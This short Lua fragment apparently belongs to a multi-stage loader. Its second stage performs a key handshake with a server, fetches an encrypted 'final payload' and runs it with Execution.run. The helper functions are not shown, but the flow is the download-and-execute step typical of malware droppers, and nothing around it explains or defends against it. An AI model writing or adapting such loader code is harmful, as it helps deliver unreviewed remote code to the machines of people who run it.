local success, err = pcall(function()
    local server_public_key_bytes = do_handshake()
    local symmetric_key, session_token = do_exchange(server_public_key_bytes)
    local payload = get_payload(session_token, symmetric_key)
    print("[Stage 2] Handing off to final payload...")
    Execution.run(payload)
end)

if not success then
    warn("[Stage 2] FATAL ERROR: " .. tostring(err))
end